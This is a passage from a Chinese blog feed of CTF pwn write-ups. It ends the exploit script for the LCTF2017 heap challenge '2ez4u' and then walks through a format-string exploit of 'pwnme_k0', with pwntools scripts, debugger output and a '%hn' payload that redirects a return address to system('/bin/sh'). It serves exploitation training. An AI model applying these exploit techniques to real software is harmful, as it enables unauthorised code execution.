class="string">'1'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'2'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'3'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'5'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'7'</span>*<span class="number">0x3f0</span>) <span class="comment"># playground</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'8'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3e0</span>, <span class="string">'9'</span>*<span class="number">0x3d0</span>) <span class="comment"># sup</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'a'</span>*<span class="number">0x30</span> )</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'b'</span>*<span class="number">0x3e0</span>) <span class="comment"># victim</span></span><br><span class="line">add(<span class="number">0x30</span>,  <span class="string">'c'</span>*<span class="number">0x30</span> )</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x9</span>)</span><br><span class="line">dele(<span class="number">0xb</span>)</span><br><span class="line">dele(<span class="number">0x0</span>)</span><br><span class="line">add(<span class="number">0x400</span>, <span class="string">'0'</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">show(<span class="number">0xb</span>)</span><br><span class="line">io.recvuntil(<span class="string">'num: '</span>)</span><br><span class="line">print(hex(c_uint32(int(io.recvline()[:<span class="number">-1</span>])).value))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'description:'</span>)</span><br><span class="line">HEAP = u64(io.recvline()[:<span class="number">-1</span>]+<span class="string">'\x00\x00'</span>)<span class="number">-0x7e0</span></span><br><span class="line">log.info(<span class="string">"heap base 0x%016x"</span> % HEAP)</span><br><span class="line"></span><br><span class="line">target_addr = HEAP+<span class="number">0xb0</span>     <span class="comment"># 1</span></span><br><span class="line">chunk1_addr = HEAP+<span class="number">0x130</span>    <span class="comment"># 2</span></span><br><span class="line">chunk2_addr = HEAP+<span class="number">0x1b0</span>    <span class="comment"># 3</span></span><br><span class="line">victim_addr = HEAP+<span class="number">0xc30</span>    <span class="comment"># b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># large bin attack</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(chunk1_addr))             <span class="comment"># victim</span></span><br><span class="line">edit(<span class="number">0x1</span>, p64(<span class="number">0x0</span>)+p64(chunk1_addr))    <span class="comment"># target</span></span><br><span class="line"></span><br><span class="line">chunk2  = p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x421</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk2 += p64(chunk1_addr)</span><br><span class="line">edit(<span class="number">0x3</span>, chunk2) <span class="comment"># chunk2</span></span><br><span class="line"></span><br><span class="line">chunk1  = <span class="string">''</span></span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x0</span>)</span><br><span class="line">chunk1 += p64(<span class="number">0x411</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x18</span>)</span><br><span class="line">chunk1 += p64(target_addr<span class="number">-0x10</span>)</span><br><span class="line">chunk1 += p64(victim_addr)</span><br><span class="line">chunk1 += p64(chunk2_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x2</span>, chunk1) <span class="comment"># chunk1</span></span><br><span class="line">edit(<span class="number">0x7</span>, <span class="string">'7'</span>*<span class="number">0x198</span>+p64(<span class="number">0x410</span>)+p64(<span class="number">0x411</span>))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line">dele(<span class="number">0x3</span>)</span><br><span class="line">add(<span class="number">0x3f0</span>, <span class="string">'3'</span>*<span class="number">0x30</span>+p64(<span class="number">0xdeadbeefdeadbeef</span>)) <span class="comment"># chunk1, arbitrary write !!!!!!!</span></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'6'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0x3</span>)</span><br><span class="line">io.recvuntil(<span class="string">'3'</span>*<span class="number">0x30</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">LIBC = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3c4be8</span></span><br><span class="line">log.info(<span class="string">"libc base 0x%016x"</span> % LIBC)</span><br><span class="line"></span><br><span class="line">junk  = <span class="string">''</span></span><br><span class="line">junk += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">junk += p64(<span class="number">0x81</span>)</span><br><span class="line">junk += p64(LIBC+<span class="number">0x3c4be8</span>)</span><br><span class="line">junk += p64(HEAP+<span class="number">0x300</span>)</span><br><span class="line">junk  = junk.ljust(<span class="number">0xa8</span>, <span class="string">'A'</span>)</span><br><span class="line">junk += p64(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x80</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x60</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">dele(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,  <span class="string">'4'</span>*<span class="number">0x60</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += junk</span><br><span class="line">recovery += p64(<span class="number">0x70</span>) <span class="comment"># 0x4-&gt;size</span></span><br><span class="line">recovery += p64(<span class="number">0x0</span>) <span class="comment"># 0x4-&gt;fd</span></span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">gdb.attach(io, <span class="string">'b *0x%x'</span> % (base_addr+<span class="number">0x124e</span>))</span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">recovery += p64(<span class="number">0x61</span>)</span><br><span class="line">recovery += p64(LIBC+<span class="number">0x3c4b50</span>)</span><br><span class="line">edit(<span class="number">0x3</span>, recovery) <span class="comment"># victim, start from HEAP+0x158</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,  p64(LIBC+<span class="number">0x3c5c50</span>)) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># recovery</span></span><br><span class="line">edit(<span class="number">0xb</span>, p64(HEAP+<span class="number">0x7e0</span>))</span><br><span class="line">dele(<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment"># </span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'/bin/sh'</span>) <span class="comment"># </span></span><br><span class="line">dele(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>*<span class="number">0x1d0</span>+p64(LIBC+<span class="number">0x4526a</span>)) <span class="comment"># </span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-25-161814.png" alt=""></p><h2 id="参考文章及题目链接"><a href="#参考文章及题目链接" class="headerlink" title="参考文章及题目链接"></a>参考文章及题目链接</h2><p><a href="https://github.com/LCTF/LCTF2017/tree/master/src/pwn/2ez4u" target="_blank" rel="noopener">https://github.com/LCTF/LCTF2017/tree/master/src/pwn/2ez4u</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> overlap </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>格式化字符串pwn retaddr及三个白帽-pwnme_k0 writeup</title>
      <link href="/2018/03/19/pwnme/"/>
      <url>/2018/03/19/pwnme/</url>
      <content type="html"><![CDATA[<h2 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h2><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/pwnme_k0" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/pwnme_k0</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这个题代码写的略智障。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-19-103337.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-19-103528.png" alt=""><br>其实一共是从rbp-30到rbp-8这么一段空间，一共40个字节来存来存账号和密码。<br>但是存账号是从v16到char v18[20]的前4个字节，确实是16个，但是这么写不会很怪么……<br>密码也是，从数组的第4个字节之后开始存，最大存20个字节，一开始看还以为有溢出，碎碎念一下。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-19-103559.png" alt=""><br>不过实际上漏洞是在打印个人信息的时候，能看到一个格式化字符串漏洞。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-19-103738.png" alt=""><br>而这个&amp;a9+4实际上就是我们输入的密码。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ checksec pwnme_k0 </span><br><span class="line">[*] &apos;/home/sakura/pwnme_k0&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="vulfunc"><a href="#vulfunc" class="headerlink" title="vulfunc"></a>vulfunc</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-19-103950.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-19-104024.png" alt=""><br>这题看了下字符串，发现有可以直接利用的system(‘/bin/sh’)，所以只要用格式化字符串漏洞直接修改某个函数的返回地址为0x4008A6就可以了。</p><h3 id="确定偏移"><a href="#确定偏移" class="headerlink" title="确定偏移"></a>确定偏移</h3><p>首先来跟随一下程序，确定格式化串的相对偏移。<br>写一个程序确定偏移。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">p=process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'break *0x400B39'</span>) <span class="comment">#一开始就把gdb attach上去，然后设置好断点位置，break *0x400B39就是设置断点，然后c一下就执行到断点位置了。</span></span><br><span class="line">p.recvuntil(<span class="string">'Input your username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your password(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'%p'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br></pre></td></tr></table></figure></p><p>输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ python offset.py</span><br><span class="line">[DEBUG] PLT 0x400740 putchar</span><br><span class="line">[DEBUG] PLT 0x400748 strcpy</span><br><span class="line">[DEBUG] PLT 0x400750 puts</span><br><span class="line">[DEBUG] PLT 0x400758 write</span><br><span class="line">[DEBUG] PLT 0x400760 setbuf</span><br><span class="line">[DEBUG] PLT 0x400768 system</span><br><span class="line">[DEBUG] PLT 0x400770 printf</span><br><span class="line">[DEBUG] PLT 0x400778 memset</span><br><span class="line">[DEBUG] PLT 0x400780 read</span><br><span class="line">[DEBUG] PLT 0x400788 __libc_start_main</span><br><span class="line">[DEBUG] PLT 0x400790 __gmon_start__</span><br><span class="line">[DEBUG] PLT 0x400798 memcpy</span><br><span class="line">[DEBUG] PLT 0x4007a0 fflush</span><br><span class="line">[DEBUG] PLT 0x4007a8 atol</span><br><span class="line">[*] &apos;/home/sakura/pwnme_k0&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[+] Starting local process &apos;./pwnme_k0&apos;: pid 2885</span><br><span class="line">[DEBUG] Wrote gdb script to &apos;/tmp/pwnoFjEm0.gdb&apos;</span><br><span class="line">    break *0x400B39</span><br><span class="line">[*] running in new terminal: /usr/bin/gdb -q  &quot;/home/sakura/pwnme_k0&quot; 2885 -x &quot;/tmp/pwnoFjEm0.gdb&quot;</span><br><span class="line">[DEBUG] Launching a new terminal: [&apos;/usr/bin/x-terminal-emulator&apos;, &apos;-e&apos;, &apos;/usr/bin/gdb -q  &quot;/home/sakura/pwnme_k0&quot; 2885 -x &quot;/tmp/pwnoFjEm0.gdb&quot;&apos;]</span><br><span class="line">[+] Waiting for debugger: Done</span><br><span class="line">[DEBUG] Received 0x127 bytes:</span><br><span class="line">    &apos;**********************************************\n&apos;</span><br><span class="line">    &apos;*                                            *\n&apos;</span><br><span class="line">    &apos;*Welcome to sangebaimao,Pwnn me and have fun!*\n&apos;</span><br><span class="line">    &apos;*                                            *\n&apos;</span><br><span class="line">    &apos;**********************************************\n&apos;</span><br><span class="line">    &apos;Register Account first!\n&apos;</span><br><span class="line">    &apos;Input your username(max lenth:20): \n&apos;</span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    &apos;aaaaaaaa\n&apos;</span><br><span class="line">[DEBUG] Received 0x24 bytes:</span><br><span class="line">    &apos;Input your password(max lenth:20): \n&apos;</span><br><span class="line">[DEBUG] Sent 0x11 bytes:</span><br><span class="line">    &apos;%p%p%p%p%p%p%p%p\n&apos;</span><br><span class="line">[DEBUG] Received 0x5f bytes:</span><br><span class="line">    &apos;Register Success!!\n&apos;</span><br><span class="line">    &apos;1.Sh0w Account Infomation!\n&apos;</span><br><span class="line">    &apos;2.Ed1t Account Inf0mation!\n&apos;</span><br><span class="line">    &apos;3.QUit sangebaimao:(\n&apos;</span><br><span class="line">    &apos;&gt;&apos;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">    &apos;1\n&apos;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    &apos;aaaaaaaa\n&apos;</span><br></pre></td></tr></table></figure></p><p>下面si只是为了跟进printf函数，个人习惯……不跟也行，只要你知道怎么数格式化串在哪，跟进去的话栈上第一个就肯定是返回地址，注意这里是64位程序，所以返回地址后跟着的就是参数7（offset 6),参数8（offset 7)…..<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; si</span><br><span class="line">0x0000000000400770 in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">[──────────────────────────────────REGISTERS───────────────────────────────────]</span><br><span class="line"> RAX  0x0</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x400</span><br><span class="line"> RDX  0x7f6c9f8829e0 (_IO_stdfile_1_lock) ◂— 0x0</span><br><span class="line"> RDI  0x7fff8ee7f1e4 ◂— 0x7025702570257025 (&apos;%p%p%p%p&apos;)---&gt;格式化字符串存在rdi里</span><br><span class="line"> RSI  0x7f6c9faa6000 ◂— 0x6161616161616161 (&apos;aaaaaaaa&apos;)</span><br><span class="line">.....</span><br><span class="line">[────────────────────────────────────DISASM────────────────────────────────────]</span><br><span class="line"> ► 0x400770                      jmp    qword ptr [rip + 0x20184a]    &lt;0x7f6c9f512340&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f6c9f512340 &lt;printf&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7f6c9f512347 &lt;printf+7&gt;     test   al, al</span><br><span class="line">   0x7f6c9f512349 &lt;printf+9&gt;     mov    qword ptr [rsp + 0x28], rsi</span><br><span class="line">   0x7f6c9f51234e &lt;printf+14&gt;    mov    qword ptr [rsp + 0x30], rdx</span><br><span class="line">   0x7f6c9f512353 &lt;printf+19&gt;    mov    qword ptr [rsp + 0x38], rcx</span><br><span class="line">   0x7f6c9f512358 &lt;printf+24&gt;    mov    qword ptr [rsp + 0x40], r8</span><br><span class="line">   0x7f6c9f51235d &lt;printf+29&gt;    mov    qword ptr [rsp + 0x48], r9</span><br><span class="line">   0x7f6c9f512362 &lt;printf+34&gt;    je     printf+91                     &lt;0x7f6c9f51239b&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7f6c9f51239b &lt;printf+91&gt;    lea    rax, [rsp + 0xe0]</span><br><span class="line">   0x7f6c9f5123a3 &lt;printf+99&gt;    mov    rsi, rdi</span><br><span class="line">[────────────────────────────────────STACK─────────────────────────────────────]</span><br><span class="line">00:0000│ rsp    0x7fff8ee7f1b8 —▸ 0x400b3e 返回地址</span><br><span class="line">01:0008│ rbp    0x7fff8ee7f1c0 —▸ 0x7fff8ee7f200 offset 6(因为格式化串是参数1，前6个参数存在寄存器里，所以这里是参数7，相对格式化串就是偏移6)</span><br><span class="line">02:0010│        0x7fff8ee7f1c8 —▸ 0x400d74 offset 7</span><br><span class="line">03:0018│        0x7fff8ee7f1d0 ◂— &apos;aaaaaaaa\n&apos; offset 8</span><br><span class="line">04:0020│        0x7fff8ee7f1d8 ◂— 0xa /* &apos;\n&apos; */ offset 9</span><br><span class="line">05:0028│ rdi-4  0x7fff8ee7f1e0 ◂— 0x7025702500000000 offset 10</span><br><span class="line">06:0030│        0x7fff8ee7f1e8 ◂— &apos;%p%p%p%p%p%p\n&apos;</span><br><span class="line">07:0038│        0x7fff8ee7f1f0 ◂— 0xa70257025 /* &apos;%p%p\n&apos; */</span><br><span class="line">[──────────────────────────────────BACKTRACE───────────────────────────────────]</span><br><span class="line"> ► f 0           400770</span><br><span class="line">   f 1           400b3e</span><br><span class="line">   f 2           400d74</span><br><span class="line">   f 3           400e98</span><br><span class="line">   f 4     7f6c9f4dff45 __libc_start_main+245</span><br></pre></td></tr></table></figure></p><p>这样就找到了，偏移为10，不过0x7025702500000000被00截断了，应该用“后入式“，把地址写在后面，所以偏移应该取12</p><h3 id="修改返回地址"><a href="#修改返回地址" class="headerlink" title="修改返回地址"></a>修改返回地址</h3><p>我们知道：<strong>虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[────────────────────────────────────STACK─────────────────────────────────────]</span><br><span class="line">00:0000│ rsp    0x7fff8ee7f1b8 —▸ 0x400b3e 返回地址</span><br><span class="line">01:0008│ rbp    0x7fff8ee7f1c0 —▸ 0x7fff8ee7f200 </span><br><span class="line">02:0010│        0x7fff8ee7f1c8 —▸ 0x400d74</span><br></pre></td></tr></table></figure></p><p>这里的返回地址是printf的返回地址，此时rbp还没有变化，还没有进入printf，还是当前函数的rbp，则rbp指向的就是old rbp的地址。<br>所以当前的返回地址就在rbp+8，即0x400d74。<br>存储返回地址的内存就是0x7fff8ee7f1c8，它相对于相对于old rbp的地址就是：0x7fff8ee7f200-0x7fff8ee7f1c8=0x38。<br>（这部分说的有点乱，先这么理解着吧……）<br>总之用格式化串先读0x7fff8ee7f1c0地址（offset 6)，得到rbp的地址是0x7fff8ee7f200，再减去0x38就得到存储返回地址的内存地址是0x7fff8ee7f1c8。<br>然后leak出这个地址后，就可以去覆盖这个地址存放的返回值为我们的system(‘/bin/sh’)即0x4008A6<br>当函数返回的时候就getshell.<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-19-145650.png" alt=""><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">p=process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'break *0x400B39'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'break *0x400B3E')</span></span><br><span class="line">p.recvuntil(<span class="string">'Input your username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your password(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">data=p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">data=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">leak_addr=hex(int(data,<span class="number">16</span>)<span class="number">-0x38</span>)</span><br><span class="line"><span class="keyword">print</span> leak_addr</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>这题的username我完全没用到，不过其实结合username更好用一些，不过<br>为了练习”后入式“，我就写的麻烦一点。<br>exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">elf=ELF(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line">p=process(<span class="string">'./pwnme_k0'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'break *0x400B39')</span></span><br><span class="line">p.recvuntil(<span class="string">'Input your username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input your password(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'%6$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">data=p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">data=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">leak_addr=int(data,<span class="number">16</span>)<span class="number">-0x38</span></span><br><span class="line"><span class="comment"># print hex(leak_addr)</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input new username(max lenth:20):'</span>)</span><br><span class="line">p.sendline(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">'please input new password(max lenth:20):'</span>)</span><br><span class="line">payload = <span class="string">"%2214u%12$hn"</span></span><br><span class="line">payload += p64(leak_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-19-162145.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-19-162241.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>在写payload的时候<br>我一直把%2214u%12$hn数成11……然后一直GG。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ python -c &apos;print len(&quot;%2214u%12$hn&quot;)&apos;</span><br><span class="line">12</span><br></pre></td></tr></table></figure></p><p>之所以做这道题。。是因为百度杯11月的一道pwn题和这题几乎一模一样…就拿来折腾下好了，不过那题没有system(‘/bin/sh’)可以利用。<br>要考虑leak出来。<br>格式化字符串大部分的利用姿势我都练到了，不过还是不够熟练，慢慢来呗~</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
